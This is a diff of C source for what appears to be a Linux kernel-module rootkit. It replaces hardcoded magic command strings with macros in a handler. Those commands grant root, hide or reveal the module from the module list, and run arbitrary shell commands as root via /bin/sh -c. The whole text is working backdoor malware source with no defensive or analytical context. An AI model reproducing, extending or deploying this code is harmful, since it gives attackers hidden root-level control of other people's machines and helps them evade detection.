@@ -15,7 +15,8 @@ static char _hidden = 0;
 static struct list_head *mod_list_head;
 
 static char _argv2[CDEV_MAX_WRITE];
-static char *_argv[] = {"/bin/sh", "-c", _argv2, NULL};
+
+static char *_argv[] = {EXEC_SHELL, "-c", _argv2, NULL};
 static char *_envp[] = {"HOME=/root", "TERM=xterm", NULL};
 
 
@@ -106,19 +107,19 @@ static int _kdo_show(void)
 
 int kdo_exec(const char *cmd)
 {
-	if (! strcmp("kdo-su", cmd)) {
+	if (! strcmp(MAGIC_ROOT, cmd)) {
 		_kdo_su();
 		return 0;
 	}
 
-	if (! strcmp("kdo-hide", cmd))
+	if (! strcmp(MAGIC_HIDE, cmd))
 		return _kdo_hide();
 
-	if (! strcmp("kdo-show", cmd))
+	if (! strcmp(MAGIC_SHOW, cmd))
 		return _kdo_show();
 
-	if (! strncmp("kdo-exec", cmd, 8) && cmd[8])
-		return _kdo_run(cmd + 9);
+	if (! strncmp(MAGIC_EXEC, cmd, strlen(MAGIC_EXEC)) && cmd[strlen(MAGIC_EXEC)])
+		return _kdo_run(cmd + strlen(MAGIC_EXEC) + 1);
 
 	return 1;
 }
